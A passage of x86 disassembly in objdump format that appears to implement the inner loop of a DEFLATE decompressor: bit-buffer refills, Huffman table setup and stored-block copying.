  407cfd:	89 43 14             	mov    %eax,0x14(%ebx)
  407d00:	a1 9c c0 46 00       	mov    0x46c09c,%eax
  407d05:	83 23 00             	andl   $0x0,(%ebx)
  407d08:	89 43 18             	mov    %eax,0x18(%ebx)
  407d0b:	8b 4c 24 18          	mov    0x18(%esp),%ecx
  407d0f:	e9 80 09 00 00       	jmp    0x408694
  407d14:	6a 07                	push   $0x7
  407d16:	8b ce                	mov    %esi,%ecx
  407d18:	c7 03 09 00 00 00    	movl   $0x9,(%ebx)
  407d1e:	58                   	pop    %eax
  407d1f:	23 c8                	and    %eax,%ecx
  407d21:	d3 ef                	shr    %cl,%edi
  407d23:	83 e6 f8             	and    $0xfffffff8,%esi
  407d26:	89 74 24 24          	mov    %esi,0x24(%esp)
  407d2a:	eb df                	jmp    0x407d0b
  407d2c:	8b 54 24 4c          	mov    0x4c(%esp),%edx
  407d30:	83 fe 20             	cmp    $0x20,%esi
  407d33:	73 33                	jae    0x407d68
  407d35:	8b 4c 24 14          	mov    0x14(%esp),%ecx
  407d39:	85 c0                	test   %eax,%eax
  407d3b:	0f 84 67 09 00 00    	je     0x4086a8
  407d41:	48                   	dec    %eax
  407d42:	89 44 24 10          	mov    %eax,0x10(%esp)
  407d46:	0f b6 01             	movzbl (%ecx),%eax
  407d49:	8b ce                	mov    %esi,%ecx
  407d4b:	d3 e0                	shl    %cl,%eax
  407d4d:	83 c6 08             	add    $0x8,%esi
  407d50:	8b 4c 24 14          	mov    0x14(%esp),%ecx
  407d54:	0b f8                	or     %eax,%edi
  407d56:	8b 44 24 10          	mov    0x10(%esp),%eax
  407d5a:	41                   	inc    %ecx
  407d5b:	89 4c 24 14          	mov    %ecx,0x14(%esp)
  407d5f:	83 fe 20             	cmp    $0x20,%esi
  407d62:	72 d5                	jb     0x407d39
  407d64:	8b 4c 24 18          	mov    0x18(%esp),%ecx
  407d68:	0f b7 c7             	movzwl %di,%eax
  407d6b:	33 f6                	xor    %esi,%esi
  407d6d:	33 ff                	xor    %edi,%edi
  407d6f:	89 43 04             	mov    %eax,0x4(%ebx)
  407d72:	89 74 24 24          	mov    %esi,0x24(%esp)
  407d76:	85 c0                	test   %eax,%eax
  407d78:	74 05                	je     0x407d7f
  407d7a:	6a 0a                	push   $0xa
  407d7c:	58                   	pop    %eax
  407d7d:	eb 06                	jmp    0x407d85
  407d7f:	8b 83 14 05 00 00    	mov    0x514(%ebx),%eax
  407d85:	89 03                	mov    %eax,(%ebx)
  407d87:	e9 08 09 00 00       	jmp    0x408694
  407d8c:	8b 54 24 4c          	mov    0x4c(%esp),%edx
  407d90:	85 c0                	test   %eax,%eax
  407d92:	0f 84 5f 09 00 00    	je     0x4086f7
  407d98:	85 ed                	test   %ebp,%ebp
  407d9a:	0f 85 a3 00 00 00    	jne    0x407e43
  407da0:	3b 8b a0 9b 00 00    	cmp    0x9ba0(%ebx),%ecx
  407da6:	75 37                	jne    0x407ddf
  407da8:	8d ab a0 1b 00 00    	lea    0x1ba0(%ebx),%ebp
  407dae:	89 6c 24 28          	mov    %ebp,0x28(%esp)
  407db2:	8b ab a4 9b 00 00    	mov    0x9ba4(%ebx),%ebp
  407db8:	3b 6c 24 28          	cmp    0x28(%esp),%ebp
  407dbc:	74 21                	je     0x407ddf
  407dbe:	8d 8b a0 1b 00 00    	lea    0x1ba0(%ebx),%ecx
  407dc4:	89 4c 24 18          	mov    %ecx,0x18(%esp)
  407dc8:	76 07                	jbe    0x407dd1
  407dca:	2b 6c 24 28          	sub    0x28(%esp),%ebp
  407dce:	4d                   	dec    %ebp
  407dcf:	eb 0a                	jmp    0x407ddb
  407dd1:	8b ab a0 9b 00 00    	mov    0x9ba0(%ebx),%ebp
  407dd7:	2b 6c 24 28          	sub    0x28(%esp),%ebp
  407ddb:	85 ed                	test   %ebp,%ebp
  407ddd:	75 64                	jne    0x407e43
  407ddf:	52                   	push   %edx
  407de0:	89 8b a8 9b 00 00    	mov    %ecx,0x9ba8(%ebx)
  407de6:	e8 69 0a 00 00       	call   0x408854
  407deb:	8b 8b a8 9b 00 00    	mov    0x9ba8(%ebx),%ecx
  407df1:	8b 93 a4 9b 00 00    	mov    0x9ba4(%ebx),%edx
  407df7:	89 4c 24 18          	mov    %ecx,0x18(%esp)
  407dfb:	3b ca                	cmp    %edx,%ecx
  407dfd:	73 07                	jae    0x407e06
  407dff:	8b ea                	mov    %edx,%ebp
  407e01:	2b e9                	sub    %ecx,%ebp
  407e03:	4d                   	dec    %ebp
  407e04:	eb 08                	jmp    0x407e0e
  407e06:	8b ab a0 9b 00 00    	mov    0x9ba0(%ebx),%ebp
  407e0c:	2b e9                	sub    %ecx,%ebp
  407e0e:	3b 8b a0 9b 00 00    	cmp    0x9ba0(%ebx),%ecx
  407e14:	75 21                	jne    0x407e37
  407e16:	8d 83 a0 1b 00 00    	lea    0x1ba0(%ebx),%eax
  407e1c:	3b d0                	cmp    %eax,%edx
  407e1e:	74 17                	je     0x407e37
  407e20:	8b c8                	mov    %eax,%ecx
  407e22:	89 4c 24 18          	mov    %ecx,0x18(%esp)
  407e26:	76 07                	jbe    0x407e2f
  407e28:	8b ea                	mov    %edx,%ebp
  407e2a:	2b e8                	sub    %eax,%ebp
  407e2c:	4d                   	dec    %ebp
  407e2d:	eb 08                	jmp    0x407e37
  407e2f:	8b ab a0 9b 00 00    	mov    0x9ba0(%ebx),%ebp
  407e35:	2b e8                	sub    %eax,%ebp
  407e37:	85 ed                	test   %ebp,%ebp
  407e39:	0f 84 92 08 00 00    	je     0x4086d1
  407e3f:	8b 44 24 10          	mov    0x10(%esp),%eax
  407e43:	3b e8                	cmp    %eax,%ebp
  407e45:	8b f0                	mov    %eax,%esi
  407e47:	0f 42 f5             	cmovb  %ebp,%esi
  407e4a:	39 73 04             	cmp    %esi,0x4(%ebx)
  407e4d:	0f 42 73 04          	cmovb  0x4(%ebx),%esi
  407e51:	56                   	push   %esi
  407e52:	ff 74 24 18          	push   0x18(%esp)
  407e56:	51                   	push   %ecx
  407e57:	e8 94 f0 ff ff       	call   0x406ef0
  407e5c:	8b 44 24 10          	mov    0x10(%esp),%eax
  407e60:	2b ee                	sub    %esi,%ebp
  407e62:	8b 4c 24 18          	mov    0x18(%esp),%ecx
  407e66:	2b c6                	sub    %esi,%eax
  407e68:	01 74 24 14          	add    %esi,0x14(%esp)
  407e6c:	03 ce                	add    %esi,%ecx
  407e6e:	29 73 04             	sub    %esi,0x4(%ebx)
  407e71:	8b 74 24 24          	mov    0x24(%esp),%esi
  407e75:	6a 0f                	push   $0xf
  407e77:	89 44 24 14          	mov    %eax,0x14(%esp)
  407e7b:	89 4c 24 1c          	mov    %ecx,0x1c(%esp)
  407e7f:	5a                   	pop    %edx
  407e80:	0f 85 15 08 00 00    	jne    0x40869b
  407e86:	8b 83 14 05 00 00    	mov    0x514(%ebx),%eax
  407e8c:	89 03                	mov    %eax,(%ebx)
  407e8e:	8b 44 24 10          	mov    0x10(%esp),%eax
  407e92:	e9 04 08 00 00       	jmp    0x40869b
  407e97:	8b 54 24 4c          	mov    0x4c(%esp),%edx
  407e9b:	eb 25                	jmp    0x407ec2
  407e9d:	85 c0                	test   %eax,%eax
  407e9f:	0f 84 b0 08 00 00    	je     0x408755
  407ea5:	48                   	dec    %eax
  407ea6:	8b ce                	mov    %esi,%ecx
  407ea8:	89 44 24 10          	mov    %eax,0x10(%esp)
  407eac:	8b 44 24 14          	mov    0x14(%esp),%eax
  407eb0:	0f b6 00             	movzbl (%eax),%eax
  407eb3:	d3 e0                	shl    %cl,%eax
  407eb5:	0b f8                	or     %eax,%edi
  407eb7:	ff 44 24 14          	incl   0x14(%esp)
  407ebb:	8b 44 24 10          	mov    0x10(%esp),%eax
  407ebf:	83 c6 08             	add    $0x8,%esi
  407ec2:	83 fe 0e             	cmp    $0xe,%esi
  407ec5:	72 d6                	jb     0x407e9d
  407ec7:	8b cf                	mov    %edi,%ecx
  407ec9:	81 e1 ff 3f 00 00    	and    $0x3fff,%ecx
  407ecf:	8b c1                	mov    %ecx,%eax
  407ed1:	89 4b 04             	mov    %ecx,0x4(%ebx)
  407ed4:	83 e0 1f             	and    $0x1f,%eax
  407ed7:	3c 1d                	cmp    $0x1d,%al
  407ed9:	0f 87 36 08 00 00    	ja     0x408715
  407edf:	81 e1 e0 03 00 00    	and    $0x3e0,%ecx
  407ee5:	81 f9 a0 03 00 00    	cmp    $0x3a0,%ecx
  407eeb:	0f 87 24 08 00 00    	ja     0x408715
  407ef1:	83 ee 0e             	sub    $0xe,%esi
  407ef4:	c1 ef 0e             	shr    $0xe,%edi
  407ef7:	83 63 08 00          	andl   $0x0,0x8(%ebx)
  407efb:	89 74 24 24          	mov    %esi,0x24(%esp)
  407eff:	c7 03 0c 00 00 00    	movl   $0xc,(%ebx)
  407f05:	8b 54 24 4c          	mov    0x4c(%esp),%edx
  407f09:	eb 50                	jmp    0x407f5b
  407f0b:	8b 44 24 10          	mov    0x10(%esp),%eax
  407f0f:	85 c0                	test   %eax,%eax
  407f11:	0f 84 3e 08 00 00    	je     0x408755
  407f17:	48                   	dec    %eax
  407f18:	8b ce                	mov    %esi,%ecx
  407f1a:	89 44 24 10          	mov    %eax,0x10(%esp)
  407f1e:	8b 44 24 14          	mov    0x14(%esp),%eax
  407f22:	0f b6 00             	movzbl (%eax),%eax
  407f25:	d3 e0                	shl    %cl,%eax
  407f27:	0b f8                	or     %eax,%edi
  407f29:	ff 44 24 14          	incl   0x14(%esp)
  407f2d:	83 c6 08             	add    $0x8,%esi
  407f30:	6a 03                	push   $0x3
  407f32:	58                   	pop    %eax
  407f33:	3b f0                	cmp    %eax,%esi
  407f35:	72 d4                	jb     0x407f0b
  407f37:	6a 07                	push   $0x7
  407f39:	58                   	pop    %eax
  407f3a:	8b cf                	mov    %edi,%ecx
  407f3c:	c1 ef 03             	shr    $0x3,%edi
  407f3f:	23 c8                	and    %eax,%ecx
  407f41:	8b 43 08             	mov    0x8(%ebx),%eax
  407f44:	6a 03                	push   $0x3
  407f46:	0f be 80 50 ab 40 00 	movsbl 0x40ab50(%eax),%eax
  407f4d:	89 4c 83 0c          	mov    %ecx,0xc(%ebx,%eax,4)
  407f51:	ff 43 08             	incl   0x8(%ebx)
  407f54:	58                   	pop    %eax
  407f55:	2b f0                	sub    %eax,%esi
  407f57:	89 74 24 24          	mov    %esi,0x24(%esp)
  407f5b:	8b 43 04             	mov    0x4(%ebx),%eax
  407f5e:	8b 4b 08             	mov    0x8(%ebx),%ecx
  407f61:	c1 e8 0a             	shr    $0xa,%eax
  407f64:	83 c0 04             	add    $0x4,%eax
  407f67:	3b c8                	cmp    %eax,%ecx
  407f69:	72 c5                	jb     0x407f30
  407f6b:	6a 13                	push   $0x13
  407f6d:	5a                   	pop    %edx
  407f6e:	eb 13                	jmp    0x407f83
  407f70:	0f be 81 50 ab 40 00 	movsbl 0x40ab50(%ecx),%eax
  407f77:	83 64 83 0c 00       	andl   $0x0,0xc(%ebx,%eax,4)
  407f7c:	8b 4b 08             	mov    0x8(%ebx),%ecx
  407f7f:	41                   	inc    %ecx
  407f80:	89 4b 08             	mov    %ecx,0x8(%ebx)
  407f83:	3b ca                	cmp    %edx,%ecx
  407f85:	72 e9                	jb     0x407f70
  407f87:	6a 07                	push   $0x7
  407f89:	58                   	pop    %eax
  407f8a:	83 64 24 30 00       	andl   $0x0,0x30(%esp)
  407f8f:	8d 8b 0c 05 00 00    	lea    0x50c(%ebx),%ecx
  407f95:	89 01                	mov    %eax,(%ecx)
  407f97:	8d 44 24 30          	lea    0x30(%esp),%eax
  407f9b:	50                   	push   %eax
  407f9c:	8d 83 20 05 00 00    	lea    0x520(%ebx),%eax
  407fa2:	50                   	push   %eax
  407fa3:	51                   	push   %ecx
  407fa4:	8d 83 10 05 00 00    	lea    0x510(%ebx),%eax
  407faa:	50                   	push   %eax
  407fab:	6a 00                	push   $0x0
  407fad:	6a 00                	push   $0x0
  407faf:	52                   	push   %edx
  407fb0:	52                   	push   %edx
  407fb1:	8d 43 0c             	lea    0xc(%ebx),%eax
  407fb4:	50                   	push   %eax
  407fb5:	e8 82 f7 ff ff       	call   0x40773c
  407fba:	85 c0                	test   %eax,%eax
  407fbc:	75 35                	jne    0x407ff3
  407fbe:	39 83 0c 05 00 00    	cmp    %eax,0x50c(%ebx)
  407fc4:	74 2d                	je     0x407ff3
  407fc6:	21 43 08             	and    %eax,0x8(%ebx)
  407fc9:	c7 03 0d 00 00 00    	movl   $0xd,(%ebx)
  407fcf:	8b 4b 04             	mov    0x4(%ebx),%ecx
  407fd2:	8b c1                	mov    %ecx,%eax
  407fd4:	8b 54 24 4c          	mov    0x4c(%esp),%edx
  407fd8:	83 e1 1f             	and    $0x1f,%ecx
  407fdb:	c1 e8 05             	shr    $0x5,%eax
  407fde:	83 e0 1f             	and    $0x1f,%eax
  407fe1:	05 02 01 00 00       	add    $0x102,%eax
  407fe6:	03 c1                	add    %ecx,%eax
  407fe8:	39 43 08             	cmp    %eax,0x8(%ebx)
  407feb:	0f 83 96 01 00 00    	jae    0x408187
  407ff1:	eb 30                	jmp    0x408023
  407ff3:	c7 03 11 00 00 00    	movl   $0x11,(%ebx)
  407ff9:	e9 0d fd ff ff       	jmp    0x407d0b
  407ffe:	8b 44 24 10          	mov    0x10(%esp),%eax
  408002:	85 c0                	test   %eax,%eax
  408004:	0f 84 4b 07 00 00    	je     0x408755
  40800a:	48                   	dec    %eax
  40800b:	8b ce                	mov    %esi,%ecx
  40800d:	89 44 24 10          	mov    %eax,0x10(%esp)
  408011:	8b 44 24 14          	mov    0x14(%esp),%eax
  408015:	0f b6 00             	movzbl (%eax),%eax
  408018:	d3 e0                	shl    %cl,%eax
  40801a:	0b f8                	or     %eax,%edi
  40801c:	ff 44 24 14          	incl   0x14(%esp)
  408020:	83 c6 08             	add    $0x8,%esi
  408023:	8b 8b 0c 05 00 00    	mov    0x50c(%ebx),%ecx
  408029:	3b f1                	cmp    %ecx,%esi
  40802b:	72 d1                	jb     0x407ffe
  40802d:	0f b7 0c 4d c4 c0 40 	movzwl 0x40c0c4(,%ecx,2),%ecx
  408034:	00 
  408035:	8b 83 10 05 00 00    	mov    0x510(%ebx),%eax
  40803b:	23 cf                	and    %edi,%ecx
  40803d:	0f b6 54 88 01       	movzbl 0x1(%eax,%ecx,4),%edx
  408042:	0f b7 44 88 02       	movzwl 0x2(%eax,%ecx,4),%eax
  408047:	89 54 24 28          	mov    %edx,0x28(%esp)
  40804b:	8b 54 24 4c          	mov    0x4c(%esp),%edx
  40804f:	89 44 24 30          	mov    %eax,0x30(%esp)
  408053:	83 f8 10             	cmp    $0x10,%eax
  408056:	73 1e                	jae    0x408076
  408058:	8b 43 08             	mov    0x8(%ebx),%eax
  40805b:	8b 4c 24 28          	mov    0x28(%esp),%ecx
  40805f:	2b f1                	sub    %ecx,%esi
  408061:	d3 ef                	shr    %cl,%edi
  408063:	8b 4c 24 30          	mov    0x30(%esp),%ecx
  408067:	89 4c 83 0c          	mov    %ecx,0xc(%ebx,%eax,4)
  40806b:	ff 43 08             	incl   0x8(%ebx)
  40806e:	8b 43 08             	mov    0x8(%ebx),%eax
  408071:	e9 ee 00 00 00       	jmp    0x408164
  408076:	83 f8 12             	cmp    $0x12,%eax
  408079:	75 05                	jne    0x408080
  40807b:	6a 07                	push   $0x7
  40807d:	59                   	pop    %ecx
  40807e:	eb 03                	jmp    0x408083
  408080:	8d 48 f2             	lea    -0xe(%eax),%ecx
  408083:	89 4c 24 24          	mov    %ecx,0x24(%esp)
  408087:	6a 0b                	push   $0xb
  408089:	59                   	pop    %ecx
  40808a:	6a 03                	push   $0x3
  40808c:	58                   	pop    %eax
  40808d:	0f 45 c8             	cmovne %eax,%ecx
  408090:	8b 44 24 24          	mov    0x24(%esp),%eax
  408094:	89 4c 24 3c          	mov    %ecx,0x3c(%esp)
  408098:	8b 4c 24 28          	mov    0x28(%esp),%ecx
  40809c:	03 c8                	add    %eax,%ecx
  40809e:	89 4c 24 2c          	mov    %ecx,0x2c(%esp)
  4080a2:	3b f1                	cmp    %ecx,%esi
  4080a4:	73 2f                	jae    0x4080d5
  4080a6:	8b 44 24 10          	mov    0x10(%esp),%eax
  4080aa:	85 c0                	test   %eax,%eax
  4080ac:	0f 84 a3 06 00 00    	je     0x408755
  4080b2:	48                   	dec    %eax
  4080b3:	8b ce                	mov    %esi,%ecx
  4080b5:	89 44 24 10          	mov    %eax,0x10(%esp)
  4080b9:	83 c6 08             	add    $0x8,%esi
  4080bc:	8b 44 24 14          	mov    0x14(%esp),%eax
  4080c0:	0f b6 00             	movzbl (%eax),%eax
  4080c3:	d3 e0                	shl    %cl,%eax
  4080c5:	0b f8                	or     %eax,%edi
  4080c7:	ff 44 24 14          	incl   0x14(%esp)
  4080cb:	3b 74 24 2c          	cmp    0x2c(%esp),%esi
  4080cf:	72 d5                	jb     0x4080a6
  4080d1:	8b 44 24 24          	mov    0x24(%esp),%eax
  4080d5:	8b 4c 24 28          	mov    0x28(%esp),%ecx
  4080d9:	d3 ef                	shr    %cl,%edi
  4080db:	0f b7 0c 45 c4 c0 40 	movzwl 0x40c0c4(,%eax,2),%ecx
  4080e2:	00 
  4080e3:	23 cf                	and    %edi,%ecx
  4080e5:	03 4c 24 3c          	add    0x3c(%esp),%ecx
  4080e9:	89 4c 24 2c          	mov    %ecx,0x2c(%esp)
  4080ed:	8b c8                	mov    %eax,%ecx
  4080ef:	03 44 24 28          	add    0x28(%esp),%eax
  4080f3:	2b f0                	sub    %eax,%esi
  4080f5:	d3 ef                	shr    %cl,%edi
  4080f7:	8b 43 08             	mov    0x8(%ebx),%eax
  4080fa:	8b 4b 04             	mov    0x4(%ebx),%ecx
  4080fd:	89 44 24 24          	mov    %eax,0x24(%esp)
  408101:	8b c1                	mov    %ecx,%eax
  408103:	c1 e8 05             	shr    $0x5,%eax
  408106:	83 e1 1f             	and    $0x1f,%ecx
  408109:	83 e0 1f             	and    $0x1f,%eax
  40810c:	05 02 01 00 00       	add    $0x102,%eax
  408111:	03 c8                	add    %eax,%ecx
  408113:	8b 44 24 24          	mov    0x24(%esp),%eax
  408117:	03 44 24 2c          	add    0x2c(%esp),%eax
  40811b:	3b c1                	cmp    %ecx,%eax
  40811d:	0f 87 14 06 00 00    	ja     0x408737
  408123:	83 7c 24 30 10       	cmpl   $0x10,0x30(%esp)
  408128:	8b 44 24 24          	mov    0x24(%esp),%eax
  40812c:	75 13                	jne    0x408141
  40812e:	83 f8 01             	cmp    $0x1,%eax
  408131:	0f 82 00 06 00 00    	jb     0x408737
  408137:	8b 4c 83 08          	mov    0x8(%ebx,%eax,4),%ecx
  40813b:	89 4c 24 30          	mov    %ecx,0x30(%esp)
  40813f:	eb 05                	jmp    0x408146
  408141:	83 64 24 30 00       	andl   $0x0,0x30(%esp)
  408146:	8b 54 24 30          	mov    0x30(%esp),%edx
  40814a:	8d 48 03             	lea    0x3(%eax),%ecx
  40814d:	8d 0c 8b             	lea    (%ebx,%ecx,4),%ecx
  408150:	40                   	inc    %eax
  408151:	89 11                	mov    %edx,(%ecx)
  408153:	83 6c 24 2c 01       	subl   $0x1,0x2c(%esp)
  408158:	8d 49 04             	lea    0x4(%ecx),%ecx
  40815b:	75 f3                	jne    0x408150
  40815d:	8b 54 24 4c          	mov    0x4c(%esp),%edx
  408161:	89 43 08             	mov    %eax,0x8(%ebx)
  408164:	8b 4b 04             	mov    0x4(%ebx),%ecx
  408167:	89 44 24 24          	mov    %eax,0x24(%esp)
  40816b:	8b c1                	mov    %ecx,%eax
  40816d:	c1 e8 05             	shr    $0x5,%eax
  408170:	83 e1 1f             	and    $0x1f,%ecx
  408173:	83 e0 1f             	and    $0x1f,%eax
  408176:	05 02 01 00 00       	add    $0x102,%eax
  40817b:	03 c1                	add    %ecx,%eax
  40817d:	39 44 24 24          	cmp    %eax,0x24(%esp)
  408181:	0f 82 9c fe ff ff    	jb     0x408023
  408187:	8b 4b 04             	mov    0x4(%ebx),%ecx
  40818a:	8d 54 24 30          	lea    0x30(%esp),%edx
  40818e:	83 a3 10 05 00 00 00 	andl   $0x0,0x510(%ebx)
  408195:	8b c1                	mov    %ecx,%eax
  408197:	83 64 24 30 00       	andl   $0x0,0x30(%esp)
  40819c:	83 e0 1f             	and    $0x1f,%eax
  40819f:	c1 e9 05             	shr    $0x5,%ecx
  4081a2:	05 01 01 00 00       	add    $0x101,%eax
  4081a7:	83 e1 1f             	and    $0x1f,%ecx
  4081aa:	89 44 24 24          	mov    %eax,0x24(%esp)
  4081ae:	52                   	push   %edx
  4081af:	41                   	inc    %ecx
  4081b0:	c7 44 24 30 09 00 00 	movl   $0x9,0x30(%esp)
  4081b7:	00 
  4081b8:	89 4c 24 40          	mov    %ecx,0x40(%esp)
  4081bc:	8d 8b 20 05 00 00    	lea    0x520(%ebx),%ecx
  4081c2:	51                   	push   %ecx
  4081c3:	8d 4c 24 34          	lea    0x34(%esp),%ecx
  4081c7:	c7 44 24 30 06 00 00 	movl   $0x6,0x30(%esp)
  4081ce:	00 
  4081cf:	51                   	push   %ecx
  4081d0:	8d 4c 24 4c          	lea    0x4c(%esp),%ecx
  4081d4:	51                   	push   %ecx
  4081d5:	68 a4 ab 40 00       	push   $0x40aba4
  4081da:	68 64 ab 40 00       	push   $0x40ab64
  4081df:	68 01 01 00 00       	push   $0x101
  4081e4:	50                   	push   %eax
  4081e5:	8d 43 0c             	lea    0xc(%ebx),%eax
  4081e8:	50                   	push   %eax
  4081e9:	e8 4e f5 ff ff       	call   0x40773c
  4081ee:	83 7c 24 2c 00       	cmpl   $0x0,0x2c(%esp)
  4081f3:	6a ff                	push   $0xffffffff
  4081f5:	59                   	pop    %ecx
  4081f6:	0f 44 c1             	cmove  %ecx,%eax
  4081f9:	85 c0                	test   %eax,%eax
  4081fb:	0f 85 32 05 00 00    	jne    0x408733
  408201:	8d 44 24 30          	lea    0x30(%esp),%eax
  408205:	50                   	push   %eax
  408206:	8d 83 20 05 00 00    	lea    0x520(%ebx),%eax
  40820c:	50                   	push   %eax
  40820d:	8d 44 24 30          	lea    0x30(%esp),%eax
  408211:	50                   	push   %eax
  408212:	8d 44 24 50          	lea    0x50(%esp),%eax
  408216:	50                   	push   %eax
  408217:	8b 44 24 34          	mov    0x34(%esp),%eax
  40821b:	68 20 ac 40 00       	push   $0x40ac20
  408220:	68 e4 ab 40 00       	push   $0x40abe4
  408225:	83 c0 03             	add    $0x3,%eax
  408228:	6a 00                	push   $0x0
  40822a:	ff 74 24 58          	push   0x58(%esp)
  40822e:	8d 04 83             	lea    (%ebx,%eax,4),%eax
  408231:	50                   	push   %eax
  408232:	e8 05 f5 ff ff       	call   0x40773c
  408237:	85 c0                	test   %eax,%eax
  408239:	0f 85 f4 04 00 00    	jne    0x408733
  40823f:	8b 44 24 28          	mov    0x28(%esp),%eax
  408243:	85 c0                	test   %eax,%eax
  408245:	75 0e                	jne    0x408255
  408247:	81 7c 24 24 01 01 00 	cmpl   $0x101,0x24(%esp)
  40824e:	00 
  40824f:	0f 87 de 04 00 00    	ja     0x408733
  408255:	8b 4c 24 2c          	mov    0x2c(%esp),%ecx
  408259:	83 23 00             	andl   $0x0,(%ebx)
  40825c:	88 43 11             	mov    %al,0x11(%ebx)
  40825f:	8b 44 24 40          	mov    0x40(%esp),%eax
  408263:	89 43 14             	mov    %eax,0x14(%ebx)
  408266:	8b 44 24 44          	mov    0x44(%esp),%eax
  40826a:	88 4b 10             	mov    %cl,0x10(%ebx)
  40826d:	89 43 18             	mov    %eax,0x18(%ebx)
  408270:	0f b6 43 10          	movzbl 0x10(%ebx),%eax
  408274:	89 43 0c             	mov    %eax,0xc(%ebx)
  408277:	8b 43 14             	mov    0x14(%ebx),%eax
  40827a:	89 43 08             	mov    %eax,0x8(%ebx)
  40827d:	8b 44 24 10          	mov    0x10(%esp),%eax
  408281:	c7 03 01 00 00 00    	movl   $0x1,(%ebx)
  408287:	8b 54 24 4c          	mov    0x4c(%esp),%edx
  40828b:	eb 25                	jmp    0x4082b2
  40828d:	85 c0                	test   %eax,%eax
  40828f:	0f 84 c0 04 00 00    	je     0x408755
  408295:	48                   	dec    %eax
  408296:	8b ce                	mov    %esi,%ecx
  408298:	89 44 24 10          	mov    %eax,0x10(%esp)
  40829c:	8b 44 24 14          	mov    0x14(%esp),%eax
  4082a0:	0f b6 00             	movzbl (%eax),%eax
  4082a3:	d3 e0                	shl    %cl,%eax
  4082a5:	0b f8                	or     %eax,%edi
  4082a7:	ff 44 24 14          	incl   0x14(%esp)
  4082ab:	8b 44 24 10          	mov    0x10(%esp),%eax
  4082af:	83 c6 08             	add    $0x8,%esi
  4082b2:	8b 4b 0c             	mov    0xc(%ebx),%ecx
  4082b5:	3b f1                	cmp    %ecx,%esi
  4082b7:	72 d4                	jb     0x40828d
  4082b9:	0f b7 0c 4d c4 c0 40 	movzwl 0x40c0c4(,%ecx,2),%ecx
  4082c0:	00 
  4082c1:	8b 43 08             	mov    0x8(%ebx),%eax
  4082c4:	23 cf                	and    %edi,%ecx
  4082c6:	8d 14 88             	lea    (%eax,%ecx,4),%edx
  4082c9:	0f b6 4c 88 01       	movzbl 0x1(%eax,%ecx,4),%ecx
  4082ce:	2b f1                	sub    %ecx,%esi
  4082d0:	d3 ef                	shr    %cl,%edi
  4082d2:	8b ca                	mov    %edx,%ecx
  4082d4:	89 54 24 3c          	mov    %edx,0x3c(%esp)
  4082d8:	89 74 24 24          	mov    %esi,0x24(%esp)
  4082dc:	0f b6 01             	movzbl (%ecx),%eax
  4082df:	85 c0                	test   %eax,%eax
  4082e1:	75 12                	jne    0x4082f5
  4082e3:	0f b7 41 02          	movzwl 0x2(%ecx),%eax
  4082e7:	89 43 08             	mov    %eax,0x8(%ebx)
  4082ea:	c7 03 06 00 00 00    	movl   $0x6,(%ebx)
  4082f0:	e9 16 fa ff ff       	jmp    0x407d0b
  4082f5:	a8 10                	test   $0x10,%al
  4082f7:	74 1e                	je     0x408317
  4082f9:	6a 0f                	push   $0xf
  4082fb:	5a                   	pop    %edx
  4082fc:	23 c2                	and    %edx,%eax
  4082fe:	89 43 08             	mov    %eax,0x8(%ebx)
  408301:	0f b7 41 02          	movzwl 0x2(%ecx),%eax
  408305:	8b 4c 24 18          	mov    0x18(%esp),%ecx
  408309:	89 43 04             	mov    %eax,0x4(%ebx)
  40830c:	c7 03 02 00 00 00    	movl   $0x2,(%ebx)
  408312:	e9 77 fb ff ff       	jmp    0x407e8e
  408317:	a8 40                	test   $0x40,%al
  408319:	75 12                	jne    0x40832d
  40831b:	89 43 0c             	mov    %eax,0xc(%ebx)
  40831e:	0f b7 41 02          	movzwl 0x2(%ecx),%eax
  408322:	8d 04 81             	lea    (%ecx,%eax,4),%eax
  408325:	89 43 08             	mov    %eax,0x8(%ebx)
  408328:	e9 de f9 ff ff       	jmp    0x407d0b
  40832d:	a8 20                	test   $0x20,%al
  40832f:	0f 84 97 04 00 00    	je     0x4087cc
  408335:	6a 07                	push   $0x7
  408337:	58                   	pop    %eax
  408338:	89 03                	mov    %eax,(%ebx)
  40833a:	e9 cc f9 ff ff       	jmp    0x407d0b
  40833f:	8b 54 24 4c          	mov    0x4c(%esp),%edx
  408343:	eb 25                	jmp    0x40836a
  408345:	85 c0                	test   %eax,%eax
  408347:	0f 84 08 04 00 00    	je     0x408755
  40834d:	48                   	dec    %eax
  40834e:	8b ce                	mov    %esi,%ecx
  408350:	89 44 24 10          	mov    %eax,0x10(%esp)
  408354:	8b 44 24 14          	mov    0x14(%esp),%eax
  408358:	0f b6 00             	movzbl (%eax),%eax
  40835b:	d3 e0                	shl    %cl,%eax
  40835d:	0b f8                	or     %eax,%edi
  40835f:	ff 44 24 14          	incl   0x14(%esp)
  408363:	8b 44 24 10          	mov    0x10(%esp),%eax
  408367:	83 c6 08             	add    $0x8,%esi
  40836a:	8b 4b 08             	mov    0x8(%ebx),%ecx
  40836d:	3b f1                	cmp    %ecx,%esi
  40836f:	72 d4                	jb     0x408345
  408371:	0f b7 04 4d c4 c0 40 	movzwl 0x40c0c4(,%ecx,2),%eax
  408378:	00 
  408379:	23 c7                	and    %edi,%eax
  40837b:	d3 ef                	shr    %cl,%edi
  40837d:	01 43 04             	add    %eax,0x4(%ebx)
  408380:	2b f1                	sub    %ecx,%esi
  408382:	0f b6 43 11          	movzbl 0x11(%ebx),%eax
  408386:	89 43 0c             	mov    %eax,0xc(%ebx)
  408389:	8b 43 18             	mov    0x18(%ebx),%eax
  40838c:	89 43 08             	mov    %eax,0x8(%ebx)
  40838f:	6a 03                	push   $0x3
  408391:	58                   	pop    %eax
  408392:	89 03                	mov    %eax,(%ebx)
  408394:	8b 44 24 10          	mov    0x10(%esp),%eax
  408398:	8b 54 24 4c          	mov    0x4c(%esp),%edx
  40839c:	eb 25                	jmp    0x4083c3
  40839e:	85 c0                	test   %eax,%eax
  4083a0:	0f 84 af 03 00 00    	je     0x408755
  4083a6:	48                   	dec    %eax
  4083a7:	8b ce                	mov    %esi,%ecx
  4083a9:	89 44 24 10          	mov    %eax,0x10(%esp)
  4083ad:	8b 44 24 14          	mov    0x14(%esp),%eax
  4083b1:	0f b6 00             	movzbl (%eax),%eax
  4083b4:	d3 e0                	shl    %cl,%eax
  4083b6:	0b f8                	or     %eax,%edi
  4083b8:	ff 44 24 14          	incl   0x14(%esp)
  4083bc:	8b 44 24 10          	mov    0x10(%esp),%eax
  4083c0:	83 c6 08             	add    $0x8,%esi
  4083c3:	8b 4b 0c             	mov    0xc(%ebx),%ecx
  4083c6:	3b f1                	cmp    %ecx,%esi
  4083c8:	72 d4                	jb     0x40839e
